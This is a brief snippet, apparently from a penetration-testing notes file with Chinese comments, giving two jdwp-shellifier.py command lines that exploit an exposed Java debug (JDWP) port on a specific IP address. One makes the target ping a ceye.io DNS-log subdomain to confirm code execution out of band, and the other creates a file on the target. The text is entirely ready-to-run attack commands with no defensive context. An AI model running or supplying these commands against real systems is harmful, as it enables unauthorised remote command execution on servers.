# Payload是DNSlog
python jdwp-shellifier.py -t 11.167.176.4 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ping 11.167.176.4.root.8yvuyw.ceye.io'

# Payload是创建文件
python jdwp-shellifier.py -t 11.167.176.4 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'touch exploit.txt'